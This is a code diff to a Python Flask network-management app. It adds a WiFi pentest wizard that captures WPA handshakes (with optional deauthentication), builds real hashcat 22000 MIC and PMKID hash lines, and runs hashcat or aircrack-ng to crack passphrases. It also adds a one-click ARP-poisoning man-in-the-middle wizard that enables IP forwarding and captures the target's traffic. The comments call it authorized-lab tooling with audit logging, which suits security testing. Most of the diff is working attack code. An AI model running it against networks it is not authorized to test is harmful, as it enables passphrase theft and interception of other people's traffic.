@@ -244,6 +244,15 @@ wifi_state = {
 recon_jobs: dict[str, dict] = {}
 recon_lock = Lock()
 
+# WiFi pentest wizard / crack lab state
+wifi_audit_jobs: dict[str, dict] = {}
+wifi_audit_lock = Lock()
+crack_jobs: dict[str, dict] = {}
+crack_lock = Lock()
+
+# MITM wizard state
+mitm_wizard_state: dict = {"target_ip": None, "forward_prev": None, "pcap_started": False}
+
 # Bug bounty state
 bb_jobs: dict[str, dict] = {}
 bb_lock = Lock()
@@ -1892,8 +1901,11 @@ def _wifi_sniffer():
                 except Exception:
                     pass
 
-            # EAPOL (handshake) capture
-            if pkt.haslayer(EAPOL) if _has_eapol(pkt) else _has_eapol_raw(pkt):
+            # EAPOL (handshake) capture — BUG FIX (Batch I): the old line
+            # `if pkt.haslayer(EAPOL) if ... else ...` referenced an undefined
+            # EAPOL name and silently swallowed the NameError in handle(),
+            # so handshake capture never fired. Simplified + guarded:
+            if _has_eapol(pkt) or _has_eapol_raw(pkt):
                 _handle_eapol(pkt, bssid)
         except Exception as e:
             pass
@@ -2027,10 +2039,25 @@ def _handle_eapol(pkt, bssid: str):
             hk["pmkid"] = info["pmkid"]
         # Append pcap bytes (we write full PCAP later with global header)
         hk["pcap"] += _pcap_packet(bytes(pkt))
-        if hk.get("anonce") and len(hk.get("mic_packets", [])) >= 1:
-            ssid = hk.get("ssid") or wifi_state["aps_seen"].get(bss, {}).get("ssid", "")
-            station = next(iter(hk["station_macs"]), sta or ap)
-            hc22000 = _make_22000(hk, ssid, ap, station)
+        # ---- Batch I: emit REAL hashcat 22000 ASCII lines ----
+        hc22000 = ""
+        crackable = False
+        ssid = hk.get("ssid") or wifi_state["aps_seen"].get(bss, {}).get("ssid", "")
+        station = next(iter(hk["station_macs"]), sta or ap)
+        ap_m = ap or bss
+        # Full 4-way path: need ANonce (M1) + at least one MIC frame (M2/M3)
+        if hk.get("anonce") and hk.get("mic_packets"):
+            eapol, mic = _eapol_zeroed(hk["mic_packets"][-1])
+            if eapol and mic:
+                hc22000 = _make_22000_mic(ssid, ap_m, station, mic, hk["anonce"], eapol)
+                crackable = bool(hc22000)
+        # PMKID path works even without a 4-way exchange
+        if hk.get("pmkid"):
+            pmkid_line = _make_22000_pmkid(hk["pmkid"], ssid, ap_m, station)
+            if pmkid_line:
+                hc22000 = pmkid_line
+                crackable = True
+        if crackable:
             pcap_path = _write_handshake_pcap(bss, ssid, hk["pcap"])
             try:
                 conn = get_db()
@@ -2043,6 +2070,8 @@ def _handle_eapol(pkt, bssid: str):
                 )
                 conn.commit()
                 conn.close()
+                generate_alert("handshake_captured",
+                               f"Crackable WPA material captured for SSID '{ssid}' ({bss})")
             except Exception:
                 pass
     except Exception as e:
@@ -2071,34 +2100,61 @@ def _write_handshake_pcap(bssid: str, ssid: str, body: bytes) -> str:
     return path
 
 
-def _make_22000(hk: dict, ssid: str, ap_mac: str, sta_mac: str) -> str:
-    """Create hashcat 22000 line (WPA-PBKDF2).
-    Format documented: hashcat 22000 =
-      signature(2) | version(2) | message_pair(1) | mic(16) | apmac(6) | nonce_ap(32) |
-      clientmac(6) | nonce_client(32) | eapol(82) | essid_len(2) | essid | keyver(1)
-    We only populate when we have a MIC.
-    """
+def _make_22000_mic(ssid: str, ap_mac: str, sta_mac: str, mic: bytes, anonce: bytes, eapol_zeroed: bytes) -> str:
+    """Build a REAL hashcat -m 22000 EAPOL hash line (hcxpcapngtool format):
+      WPA*02*MIC*MAC_AP*MAC_STA*ESSID*ANONCE*EAPOL*EAPOL_LEN
+    MIC field = 16-byte MIC hex; EAPOL = full EAPOL frame with MIC zeroed;
+    EAPOL_LEN = 2-byte length hex. Returns '' if inputs are incomplete.
+    (Batch I: the old base64 blob was NOT a hashcat-consumable format.)"""
     try:
-        mic_pkt = hk["mic_packets"][-1]
-        parsed = _parse_eapol_bytes(mic_pkt)
-        if not parsed:
+        if not mic or len(mic) != 16 or not anonce or len(anonce) != 32 or not eapol_zeroed:
             return ""
-        signature = b"WPA"
-        version = struct.pack("<H", 0x0002)
-        message_pair = bytes([0x02])  # M2
-        ap_mac_b = _mac_bytes(ap_mac)
-        sta_mac_b = _mac_bytes(sta_mac)
-        anonce = hk.get("anonce") or parsed.get("anonce") or b"\x00" * 32
-        snonce = hk.get("snonce") or parsed.get("snonce") or b"\x00" * 32
-        mic = parsed["mic"] or b"\x00" * 16
-        eapol_payload = parsed["eapol_payload"].ljust(82, b"\x00")[:82]
-        ssid_b = (ssid or "").encode("utf-8")[:32]
-        essid_len = struct.pack("<H", len(ssid_b))
-        keyver = bytes([parsed.get("keyver", 2)])
-        line = signature + version + message_pair + mic + ap_mac_b + anonce + sta_mac_b + snonce + eapol_payload + essid_len + ssid_b + keyver
-        return base64.b64encode(line).decode("ascii")
+        essid_hex = (ssid or "").encode("utf-8")[:32].hex()
+        return "*".join(["WPA", "02", mic.hex(),
+                         _mac_bytes(ap_mac).hex(), _mac_bytes(sta_mac).hex(),
+                         essid_hex, anonce.hex(), eapol_zeroed.hex(),
+                         f"{len(eapol_zeroed):04x}"])
     except Exception:
         return ""
+
+
+def _make_22000_pmkid(pmkid: bytes, ssid: str, ap_mac: str, sta_mac: str) -> str:
+    """Build a hashcat -m 22000 PMKID hash line:
+      WPA*01*PMKID*MAC_AP*MAC_STA*ESSID***"""
+    try:
+        if not pmkid or len(pmkid) != 16:
+            return ""
+        essid_hex = (ssid or "").encode("utf-8")[:32].hex()
+        return "*".join(["WPA", "01", pmkid.hex(),
+                         _mac_bytes(ap_mac).hex(), _mac_bytes(sta_mac).hex(),
+                         essid_hex, "", "", ""])
+    except Exception:
+        return ""
+
+
+def _eapol_zeroed(frame_bytes: bytes) -> tuple[bytes | None, bytes | None]:
+    """Extract the full EAPOL payload from an 802.11 data frame and return
+    (eapol_with_MIC_zeroed, mic). hashcat requires the MIC field inside the
+    EAPOL bytes to be zeroed."""
+    try:
+        idx = frame_bytes.find(b"\x88\x8e")  # EAPOL ethertype
+        if idx < 0:
+            return None, None
+        e0 = idx + 2
+        if e0 + 4 > len(frame_bytes) or frame_bytes[e0 + 1] != 3:  # EAPOL-Key
+            return None, None
+        blen = struct.unpack(">H", frame_bytes[e0 + 2:e0 + 4])[0]
+        eapol = bytearray(frame_bytes[e0:e0 + 4 + blen])
+        if len(eapol) < 4 + 93:
+            return None, None
+        mic_off = 4 + 77  # key block offset 4; MIC at 77 within key descriptor
+        mic = bytes(eapol[mic_off:mic_off + 16])
+        if mic == b"\x00" * 16:
+            return None, None  # no MIC present -> not a usable message
+        eapol[mic_off:mic_off + 16] = b"\x00" * 16
+        return bytes(eapol), mic
+    except Exception:
+        return None, None
 
 
 def _parse_eapol_bytes(frame: bytes) -> dict | None:
@@ -2275,6 +2331,369 @@ def wifi_site_survey_csv() -> str:
 
 
 # ============================================================
+# BATCH I: WiFi PENTEST WIZARD + CRACK LAB + ONE-CLICK AUDIT
+# (wifite-style guided flow; authorized-lab only, audit-logged)
+# ============================================================
+KNOWN_WIFI_CHIPS = [
+    ("rtl8812au", "Alfa AWUS036ACH/AC⼁ — excellent monitor+injection"),
+    ("rtl8811au", "Alfa AWUS036ACS — good budget pick"),
+    ("rtl8814au", "Alfa AWUS1900 — excellent, 4-stream"),
+    ("ath9k_htc", "Atheros AR9271 (Alfa AWUS036NHA) — classic reliable"),
+    ("rt2800usb", "Ralink RT3070/5370 — solid monitor support"),
+    ("mt7601u", "MediaTek MT7601U — monitor ok, injection flaky"),
+    ("iwlwifi", "Intel integrated — monitor mode limited, injection usually no"),
+    ("brcmfmac", "Broadcom onboard — monitor support varies by firmware"),
+]
+
+WORDLIST_DIR = os.environ.get(
+    "WORDLIST_DIR",
+    os.path.join(os.path.dirname(os.path.abspath(__file__)), "wordlists"))
+os.makedirs(WORDLIST_DIR, exist_ok=True)
+
+
+def wifi_capabilities() -> dict:
+    """Inventory wireless interfaces (driver, monitor support) + audit toolchain."""
+    caps = {"platform": platform.system(),
+            "is_root": hasattr(os, "geteuid") and os.geteuid() == 0,
+            "interfaces": [],
+            "tools": {t: bool(shutil.which(t)) for t in
+                      ("iw", "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng",
+                       "hashcat", "hcxpcapngtool", "tshark", "tcpdump")},
+            "chip_hints": [],
+            "recommendations": []}
+    for name in psutil.net_if_addrs().keys():
+        entry = {"name": name, "wireless": os.path.isdir(f"/sys/class/net/{name}/wireless"),
+                 "driver": "", "chip_hint": ""}
+        try:
+            drv = os.path.basename(os.readlink(f"/sys/class/net/{name}/device/driver"))
+            entry["driver"] = drv
+            for key, hint in KNOWN_WIFI_CHIPS:
+                if key in drv:
+                    entry["chip_hint"] = hint
+                    caps["chip_hints"].append(f"{name}: {drv} — {hint}")
+        except Exception:
+            pass
+        if entry["wireless"]:
+            caps["interfaces"].append(entry)
+    # udev/lsusb hints
+    for cmd in (["lsusb"],):
+        if shutil.which(cmd[0]):
+            rc, out, _ = _run(cmd, timeout=5)
+            for line in out.splitlines():
+                low = line.lower()
+                if any(k in low for k in ("wireless", "802.11", "ralink", "atheros", "realtek", "mediatek")):
+                    caps["chip_hints"].append(line.strip()[:160])
+    if not caps["interfaces"]:
+        caps["recommendations"].append("No wireless interface found — plug a USB adapter with monitor+injection support (rtl8812au / ath9k_htc).")
+    if not caps["is_root"]:
+        caps["recommendations"].append("Run as root (sudo) — monitor mode, injection and raw capture require it.")
+    if not caps["tools"].get("hashcat"):
+        caps["recommendations"].append("Install hashcat for GPU-grade WPA crack lab (apt-get install hashcat).")
+    if not caps["tools"].get("aircrack-ng"):
+        caps["recommendations"].append("Install aircrack-ng for CPU fallback cracking + airmon-ng monitor management.")
+    return caps
+
+
+def start_wifi_audit(target_bssid: str | None = None, survey_seconds: int = 45,
+                     handshake_seconds: int = 90, deauth: bool = False) -> tuple[str, str | None]:
+    """One-click orchestrated WiFi audit job with phases:
+    check -> monitor -> survey -> handshake -> report."""
+    job_id = f"wifi_{secrets.token_hex(6)}"
+    with wifi_audit_lock:
+        wifi_audit_jobs[job_id] = {
+            "job_id": job_id, "status": "queued",
+            "phases": {"check": "pending", "monitor": "pending", "survey": "pending",
+                       "handshake": "pending", "report": "pending"},
+            "log": [], "started_at": datetime.now().isoformat(), "finished_at": None,
+            "result": {"aps": 0, "handshakes": 0, "crackable": 0, "findings": []},
+            "error": ""}
+
+    def run():
+        j = wifi_audit_jobs[job_id]
+
+        def log(m: str):
+            with wifi_audit_lock:
+                j["log"].append(f"[{datetime.now().strftime('%H:%M:%S')}] {m}")
+
+        def ph(name: str, st: str):
+            with wifi_audit_lock:
+                j["phases"][name] = st
+
+        def fail(msg: str):
+            with wifi_audit_lock:
+                j["status"] = "failed"
+                j["error"] = msg
+                j["finished_at"] = datetime.now().isoformat()
+            log(f"✖ {msg}")
+
+        j["status"] = "running"
+        # -- check phase --
+        ph("check", "running")
+        log("Preflight: platform / root / adapter / tools …")
+        caps = wifi_capabilities()
+        if caps["platform"] != "Linux":
+            ph("check", "error"); return fail("WiFi pentest lab requires Linux (monitor mode).")
+        if not caps["is_root"]:
+            ph("check", "error"); return fail("Root required (sudo python3 network_manager.py).")
+        if not caps["interfaces"] and not get_wifi_interface():
+            ph("check", "error"); return fail("No wireless interface detected.")
+        ph("check", "done")
+        log(f"OK: {len(caps['interfaces'])} wireless iface(s), tools: "
+            + ", ".join(k for k, v in caps["tools"].items() if v) or "none")
+
+        # -- monitor --
+        ph("monitor", "running")
+        ok, msg = wifi_enable_monitor()
+        if not ok:
+            ph("monitor", "error"); return fail(f"Monitor mode failed: {msg}")
+        log(f"Monitor mode: {msg}")
+        ph("monitor", "done")
+
+        # -- survey --
+        ph("survey", "running")
+        ok, msg = wifi_start_survey(duration=survey_seconds, channel_hop=True)
+        if not ok:
+            ph("survey", "error")
+            wifi_disable_monitor(); return fail(f"Survey failed: {msg}")
+        log(f"Survey running {survey_seconds}s (channel-hopping)…")
+        time.sleep(max(5, survey_seconds))
+        aps = wifi_get_aps()
+        with wifi_audit_lock:
+            j["result"]["aps"] = len(aps)
+        log(f"Survey complete: {len(aps)} APs discovered")
+        wpa2 = [a for a in aps if "WPA" in (a.get("crypto") or "")]
+        open_aps = [a for a in aps if (a.get("crypto") or "").lower() in ("open", "")]
+        for a in open_aps:
+            with wifi_audit_lock:
+                j["result"]["findings"].append(f"OPEN network in range: {a.get('ssid', '?')} ({a.get('bssid', '')})")
+        ph("survey", "done")
+
+        # -- handshake capture --
+        ph("handshake", "running")
+        before = len(wifi_get_handshakes())
+        ok, msg = wifi_start_handshake_capture(target_bssid, deauth=deauth)
+        if ok:
+            log(f"Handshake capture {handshake_seconds}s"
+                + (f" targeting {target_bssid}" if target_bssid else " (all APs)")
+                + (" +deauth" if deauth else ""))
+            time.sleep(max(10, handshake_seconds))
+            wifi_stop_handshake_capture()
+            hs = wifi_get_handshakes()
+            new_hs = len(hs) - before
+            crackable = sum(1 for h in hs if h.get("hashcat_22000"))
+            with wifi_audit_lock:
+                j["result"]["handshakes"] = new_hs
+                j["result"]["crackable"] = crackable
+            log(f"Capture complete: {new_hs} new handshakes ({crackable} crackable total)")
+        else:
+            log(f"Handshake capture skipped: {msg}")
+        ph("handshake", "done")
+
+        # -- report --
+        ph("report", "running")
+        with wifi_audit_lock:
+            j["result"]["findings"].append(
+                f"{len(wpa2)} WPA-protected APs observed; {len(open_aps)} open APs observed")
+            crackable_now = sum(1 for h in wifi_get_handshakes() if h.get("hashcat_22000"))
+            if crackable_now:
+                j["result"]["findings"].append(
+                    f"{crackable_now} crackable handshakes/PMKIDs — use the Crack Lab with a wordlist to test passphrase strength")
+        log("Audit report ready in WiFi section (AP table + handshakes + findings).")
+        ph("report", "done")
+        audit("wifi_audit_complete", details=f"target={target_bssid or 'all'} aps={len(aps)}")
+        with wifi_audit_lock:
+            j["status"] = "done"
+            j["finished_at"] = datetime.now().isoformat()
+
+    threading.Thread(target=run, daemon=True).start()
+    return job_id, None
+
+
+def wifi_audit_job(job_id: str) -> dict | None:
+    with wifi_audit_lock:
+        j = wifi_audit_jobs.get(job_id)
+        return dict(j, log=list(j["log"])) if j else None
+
+
+def list_wifi_audits(limit: int = 20) -> list[dict]:
+    with wifi_audit_lock:
+        out = []
+        for j in sorted(wifi_audit_jobs.values(), key=lambda x: x["started_at"], reverse=True)[:limit]:
+            out.append({"job_id": j["job_id"], "status": j["status"], "started_at": j["started_at"],
+                        "finished_at": j["finished_at"], "result": j["result"], "error": j["error"]})
+        return out
+
+
+# ---- Crack lab ----
+def _resolve_wordlist(name: str) -> str | None:
+    """Sanitize a wordlist selection to a file inside WORDLIST_DIR only."""
+    if not name:
+        return None
+    base = os.path.basename(name)  # path-traversal guard
+    path = os.path.join(WORDLIST_DIR, base)
+    if not os.path.isfile(path):
+        return None
+    if os.path.getsize(path) > 2 * 1024 * 1024 * 1024:
+        return None
+    return path
+
+
+def list_wordlists() -> list[dict]:
+    out = []
+    try:
+        for fn in sorted(os.listdir(WORDLIST_DIR)):
+            p = os.path.join(WORDLIST_DIR, fn)
+            if os.path.isfile(p):
+                lines = 0
+                try:
+                    if os.path.getsize(p) < 64 * 1024 * 1024:
+                        with open(p, "rb") as f:
+                            lines = sum(1 for _ in f)
+                except Exception:
+                    pass
+                out.append({"name": fn, "size": os.path.getsize(p), "lines": lines})
+    except Exception:
+        pass
+    return out
+
+
+def start_crack_job(handshake_id: int, wordlist_name: str) -> tuple[bool, str, str | None]:
+    """Crack a captured handshake with hashcat (-m 22000) or aircrack-ng (CPU fallback).
+    Authorized-lab feature: tests passphrase strength of YOUR OWN captured material."""
+    conn = get_db()
+    row = conn.execute("SELECT * FROM wifi_handshakes WHERE id=?", (handshake_id,)).fetchone()
+    conn.close()
+    if not row:
+        return False, "handshake not found", None
+    wpath = _resolve_wordlist(wordlist_name)
+    if not wpath:
+        return False, f"wordlist not found in {WORDLIST_DIR} (see GET /api/wifi/wordlists)", None
+    hcx = (row["hashcat_22000"] or "").strip()
+    pcap = row["pcap_path"] or ""
+    engine = None
+    hashfile = None
+    if shutil.which("hashcat") and hcx:
+        engine = "hashcat"
+        hashfile = os.path.join(tempfile.mkdtemp(prefix="na_crack_"), f"{handshake_id}.hc22000")
+        with open(hashfile, "w") as f:
+            f.write(hcx + "\n")
+    elif shutil.which("aircrack-ng") and pcap and os.path.exists(pcap):
+        engine = "aircrack-ng"
+    if not engine:
+        return False, "Need hashcat (+hc22000 line) or aircrack-ng (+pcap). Install via Settings & Tools.", None
+
+    job_id = f"crack_{secrets.token_hex(6)}"
+    with crack_lock:
+        crack_jobs[job_id] = {"job_id": job_id, "handshake_id": handshake_id,
+                              "engine": engine, "wordlist": os.path.basename(wpath),
+                              "status": "running", "log": [], "password": "",
+                              "started_at": datetime.now().isoformat(), "finished_at": None,
+                              "proc": None}
+
+    def run():
+        j = crack_jobs[job_id]
+
+        def log(m: str):
+            with crack_lock:
+                j["log"].append(f"[{datetime.now().strftime('%H:%M:%S')}] {m}")
+                if len(j["log"]) > 300:
+                    j["log"][:] = j["log"][-300:]
+
+        try:
+            pot = os.path.join(tempfile.mkdtemp(prefix="na_pot_"), "out.pot")
+            if engine == "hashcat":
+                cmd = ["hashcat", "-m", "22000", "-a", "0", "--quiet",
+                       "--status", "--status-timer", "5", "--potfile-path", pot,
+                       hashfile, wpath]
+            else:
+                cmd = ["aircrack-ng", "-w", wpath, pcap]
+            log("exec: " + " ".join(cmd))
+            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                    text=True, bufsize=1,
+                                    preexec_fn=os.setsid if hasattr(os, "setsid") else None)
+            with crack_lock:
+                j["proc_pid"] = proc.pid
+            assert proc.stdout is not None
+            found = ""
+            for line in proc.stdout:
+                log(line.rstrip()[:400])
+                m = re.search(r"KEY FOUND! \[ ([^\]]+) \]", line)
+                if m:
+                    found = m.group(1)
+                if j["status"] == "stopping":
+                    try:
+                        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+                    except Exception:
+                        pass
+                    break
+            try:
+                proc.wait(timeout=10)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+            # potfile parse (hashcat): hash:password
+            if not found and engine == "hashcat" and os.path.exists(pot):
+                try:
+                    with open(pot, "r") as f:
+                        for pl in f:
+                            pl = pl.rstrip("\n")
+                            if pl.startswith("WPA*") and ":" in pl:
+                                found = pl.rsplit(":", 1)[1]
+                except Exception:
+                    pass
+            with crack_lock:
+                j["finished_at"] = datetime.now().isoformat()
+                j["proc"] = None
+                if found:
+                    j["status"] = "cracked"
+                    j["password"] = found
+            if found:
+                log(f"✔ CRACKED: '{found}'")
+                conn = get_db()
+                conn.execute("UPDATE wifi_handshakes SET cracked_password=? WHERE id=?",
+                             (found, handshake_id))
+                conn.commit(); conn.close()
+                generate_alert("wifi_password_cracked",
+                               f"Lab result: WPA passphrase for '{row['ssid'] or row['bssid']}' "
+                               f"was cracked from the wordlist — rotate to a stronger passphrase.")
+                audit("wifi_crack_success", details=f"hs={handshake_id} engine={engine}")
+            else:
+                with crack_lock:
+                    j["status"] = "stopped" if j["status"] == "stopping" else "done"
+                log("wordlist exhausted — passphrase not in list (this is GOOD for your network).")
+            audit("wifi_crack_finished", details=f"hs={handshake_id} found={bool(found)}",
+                  success=1 if found else 0)
+        except Exception as e:
+            with crack_lock:
+                j["status"] = "failed"
+                j["finished_at"] = datetime.now().isoformat()
+            log(f"✖ crack job failed: {e}")
+
+    threading.Thread(target=run, daemon=True).start()
+    return True, engine, job_id
+
+
+def crack_job(job_id: str) -> dict | None:
+    with crack_lock:
+        j = crack_jobs.get(job_id)
+        if not j:
+            return None
+        out = dict(j, log=list(j["log"]))
+        out.pop("proc", None)
+        return out
+
+
+def stop_crack_job(job_id: str) -> tuple[bool, str]:
+    with crack_lock:
+        j = crack_jobs.get(job_id)
+        if not j:
+            return False, "job not found"
+        if j["status"] != "running":
+            return False, f"job is {j['status']}"
+        j["status"] = "stopping"
+    return True, "stopping…"
+
+
+# ============================================================
 # BLOCK/MITM/DNS-SPOOF (kept from original)
 # ============================================================
 blocking_threads: dict[str, dict] = {}
@@ -2324,12 +2743,17 @@ def start_mitm_attack(target_ip, enable_dns_spoof=False, fake_ip=None):
     global active_mitm_attacks
     if not SCAPY_AVAILABLE:
         return False, "Scapy not installed"
+    gw = get_default_gateway()
+    # Safety guard: never poison the gateway or ourselves — that kills the LAN
+    if target_ip == gw:
+        return False, "Refusing to MITM the gateway (would blackhole the whole LAN)"
+    if target_ip == get_local_ip():
+        return False, "Refusing to MITM ourselves"
     if target_ip in active_mitm_attacks and active_mitm_attacks[target_ip].get("active"):
         return False, "MITM already running on this target"
     target_mac = get_mac_from_arp(target_ip)
     if not target_mac:
         return False, "Could not resolve target MAC"
-    gw = get_default_gateway()
     gw_mac = get_mac_from_arp(gw)
     if not gw_mac:
         return False, "Could not resolve gateway MAC"
@@ -2371,6 +2795,108 @@ def stop_mitm_attack(target_ip):
 def get_active_mitm_attacks():
     return [{"target_ip": ip, "active": v.get("active"), "dns_spoof_enabled": v.get("dns_spoof"), "fake_ip": v.get("fake_ip")}
             for ip, v in active_mitm_attacks.items()]
+
+
+# ============================================================
+# BATCH I: MITM WIZARD — one-click ARP relay + capture
+# (bettercap-style guided flow for your OWN lab network;
+#  TLS contents are NOT decrypted by design)
+# ============================================================
+def _ip_forward_get() -> str | None:
+    try:
+        with open("/proc/sys/net/ipv4/ip_forward") as f:
+            return f.read().strip()
+    except Exception:
+        return None
+
+
+def _ip_forward_set(value: int) -> str | None:
+    """Set net.ipv4.ip_forward; returns the previous value (None if unable)."""
+    prev = _ip_forward_get()
+    if prev is None:
+        return None
+    try:
+        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+            f.write(str(value))
+        return prev
+    except Exception as e:
+        print(f"[!] ip_forward write failed ({e}) — root required for MITM relay")
+        return None
+
+
+def start_mitm_wizard(target_ip: str, stop_capture_first: bool = True) -> tuple[bool, str]:
+    """One-click MITM: enable IP forwarding (so the victim keeps working),
+    poison ARP both ways, and start the traffic viewer capture automatically."""
+    global mitm_wizard_state
+    try:
+        ipaddress.ip_address(target_ip)
+    except ValueError:
+        return False, "bad target ip"
+    if mitm_wizard_state.get("target_ip"):
+        return False, f"wizard already running on {mitm_wizard_state['target_ip']} — stop it first"
+    prev_ok = True
+    if platform.system() == "Linux":
+        prev = _ip_forward_set(1)
+        prev_ok = prev is not None
+        mitm_wizard_state["forward_prev"] = prev
+        if not prev_ok:
+            return False, "Could not enable IP forwarding (root required) — aborting before any ARP change"
+    ok, msg = start_mitm_attack(target_ip)
+    if not ok:
+        # roll back forwarding
+        if mitm_wizard_state.get("forward_prev") is not None:
+            _ip_forward_set(int(mitm_wizard_state["forward_prev"]))
+        mitm_wizard_state["forward_prev"] = None
+        return False, msg
+    # Start traffic capture so intercepted HTTP/DNS/SNI shows up in Live Traffic
+    cok, cmsg = start_packet_capture(None, "")
+    mitm_wizard_state["pcap_started"] = cok
+    mitm_wizard_state["target_ip"] = target_ip
+    mitm_wizard_state["started_at"] = datetime.now().isoformat()
+    audit("mitm_wizard_start", device_ip=target_ip,
+          details=f"forwarding=on capture={cok}")
+    generate_alert("mitm_lab", f"MITM lab relay started on {target_ip} — remember to stop it when done")
+    return True, f"MITM relay active on {target_ip} (forwarding on, capture running). Stop it when done!"
+
+
+def stop_mitm_wizard() -> tuple[bool, str]:
+    """Undo everything: stop spoofing, restore ARP, restore forwarding, stop capture."""
+    global mitm_wizard_state
+    target = mitm_wizard_state.get("target_ip")
+    msgs = []
+    if target:
+        ok, m = stop_mitm_attack(target)
+        msgs.append(m)
+    else:
+        msgs.append("no active MITM target")
+    prev = mitm_wizard_state.get("forward_prev")
+    if prev is not None:
+        _ip_forward_set(int(prev))
+        msgs.append(f"ip_forward restored to {prev}")
+    if mitm_wizard_state.get("pcap_started"):
+        stop_packet_capture()
+        msgs.append("capture stopped")
+    mitm_wizard_state = {"target_ip": None, "forward_prev": None, "pcap_started": False}
+    audit("mitm_wizard_stop", device_ip=target or "", details="; ".join(msgs))
+    return True, "; ".join(msgs)
+
+
+def mitm_wizard_status() -> dict:
+    target = mitm_wizard_state.get("target_ip")
+    fwd = _ip_forward_get()
+    intercepted = {"http": 0, "dns": 0, "tls_sni": 0}
+    if target:
+        with data_lock:
+            for t in live_traffic:
+                if t.get("source_ip") == target:
+                    key = {"HTTP": "http", "DNS": "dns", "TLS_SNI": "tls_sni"}.get(t.get("type"))
+                    if key:
+                        intercepted[key] += 1
+    return {"target_ip": target, "active": bool(target),
+            "ip_forward": fwd, "started_at": mitm_wizard_state.get("started_at"),
+            "forwarding_note": "TLS contents are NOT decrypted (no sslstrip) — HTTP hosts, DNS and TLS SNI are visible.",
+            "intercepted": intercepted,
+            "active_mitm": get_active_mitm_attacks()}
 
 
 DNS_SPOOF_RULES: dict[str, str] = {}
@@ -3913,8 +4439,12 @@ def cleanup_network_actions():
     for ip in list(active_mitm_attacks.keys()):
         try: stop_mitm_attack(ip)
         except Exception: pass
+    try:
+        if mitm_wizard_state.get("target_ip") or mitm_wizard_state.get("forward_prev") is not None:
+            stop_mitm_wizard()
+    except Exception: pass
     time.sleep(0.5)
-    print("[*] Cleanup complete (ARP/managed mode restored)")
+    print("[*] Cleanup complete (ARP/forwarding/managed mode restored)")
 
 
 # ============================================================
@@ -5444,6 +5974,80 @@ def api_wifi_events():
     return jsonify([dict(r) for r in rows])
 
 
+# ---- Batch I: WiFi pentest wizard + crack lab ----
+@app.route("/api/wifi/capabilities")
+@login_required
+def api_wifi_caps():
+    return jsonify(wifi_capabilities())
+
+
+@app.route("/api/wifi/audit/start", methods=["POST"])
+@login_required
+def api_wifi_audit_start():
+    d = get_json_body()
+    bssid = (d.get("bssid") or "").upper() or None
+    survey = min(max(int(d.get("survey_seconds", 45)), 5), 600)
+    hs = min(max(int(d.get("handshake_seconds", 90)), 10), 900)
+    deauth = bool(d.get("deauth", False))
+    if deauth and get_setting("confirm_attack", "1") == "1" and not d.get("confirmed"):
+        return jsonify({"success": False,
+                        "error": "deauth is disruptive — resend with confirmed=true after the UI prompt"}), 400
+    job_id, err = start_wifi_audit(bssid, survey, hs, deauth)
+    audit("wifi_audit_start", details=f"bssid={bssid or 'all'} survey={survey}s hs={hs}s deauth={deauth}")
+    return jsonify({"success": True, "job_id": job_id})
+
+
+@app.route("/api/wifi/audit/jobs")
+@login_required
+def api_wifi_audit_jobs():
+    return jsonify(list_wifi_audits())
+
+
+@app.route("/api/wifi/audit/jobs/<job_id>")
+@login_required
+def api_wifi_audit_job(job_id):
+    j = wifi_audit_job(job_id)
+    if not j:
+        return jsonify({"success": False, "error": "not found"}), 404
+    return jsonify({"success": True, "job": j})
+
+
+@app.route("/api/wifi/wordlists")
+@login_required
+def api_wifi_wordlists():
+    return jsonify({"dir": WORDLIST_DIR, "wordlists": list_wordlists()})
+
+
+@app.route("/api/wifi/handshakes/<int:hid>/crack", methods=["POST"])
+@login_required
+def api_wifi_crack(hid):
+    d = get_json_body()
+    wl = str(d.get("wordlist", "")).strip()
+    if not wl:
+        return jsonify({"success": False, "error": "wordlist required (name from /api/wifi/wordlists)"}), 400
+    ok, engine_or_msg, job_id = start_crack_job(hid, wl)
+    if not ok:
+        return jsonify({"success": False, "error": engine_or_msg}), 400
+    audit("wifi_crack_start", details=f"hs={hid} engine={engine_or_msg} wl={wl}")
+    return jsonify({"success": True, "engine": engine_or_msg, "job_id": job_id})
+
+
+@app.route("/api/wifi/crack/<job_id>")
+@login_required
+def api_wifi_crack_status(job_id):
+    j = crack_job(job_id)
+    if not j:
+        return jsonify({"success": False, "error": "not found"}), 404
+    return jsonify({"success": True, "job": j})
+
+
+@app.route("/api/wifi/crack/<job_id>/stop", methods=["POST"])
+@login_required
+def api_wifi_crack_stop(job_id):
+    ok, msg = stop_crack_job(job_id)
+    return jsonify({"success": ok, "message": msg})
+
+
 # ---- Block/MITM/DNS spoof packet-capture/alerts/traffic/ja3/dns/parental/export (compact) ----
 @app.route("/api/bandwidth")
 @login_required
@@ -5583,6 +6187,41 @@ def api_trafsum():
 @app.route("/api/active-mitm")
 @login_required
 def api_active_mitm(): return jsonify(get_active_mitm_attacks())
+
+
+@app.route("/api/mitm/wizard/start", methods=["POST"])
+@login_required
+def api_mitm_wizard_start():
+    d = get_json_body()
+    tgt = str(d.get("target", "")).strip()
+    if not tgt:
+        tgt = str(d.get("ip", "")).strip()
+    if not tgt and d.get("mac"):
+        conn = get_db()
+        row = conn.execute("SELECT ip FROM devices WHERE mac=?", (d["mac"],)).fetchone()
+        conn.close()
+        tgt = row["ip"] if row else ""
+    if not tgt:
+        return jsonify({"success": False, "error": "target ip (or device mac) required"}), 400
+    try:
+        ipaddress.ip_address(tgt)
+    except ValueError:
+        return jsonify({"success": False, "error": "not a valid IP"}), 400
+    ok, msg = start_mitm_wizard(tgt)
+    return jsonify({"success": ok, "message": msg})
+
+
+@app.route("/api/mitm/wizard/stop", methods=["POST"])
+@login_required
+def api_mitm_wizard_stop():
+    ok, msg = stop_mitm_wizard()
+    return jsonify({"success": ok, "message": msg})
+
+
+@app.route("/api/mitm/wizard/status")
+@login_required
+def api_mitm_wizard_status():
+    return jsonify(mitm_wizard_status())
 
 
 @app.route("/api/devices/<mac>/start-mitm", methods=["POST"])
